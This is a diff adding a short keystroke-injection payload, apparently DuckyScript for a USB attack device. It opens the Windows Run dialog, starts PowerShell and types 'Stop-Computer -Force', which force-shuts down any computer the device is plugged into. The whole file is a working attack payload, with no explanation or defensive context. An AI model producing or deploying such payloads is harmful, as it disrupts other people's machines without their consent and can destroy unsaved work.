@@ -1,0 +1,7 @@
+GUI r
+DELAY 200
+STRING powershell
+ENTER
+DELAY 1050
+STRING Stop-Computer -Force
+ENTER
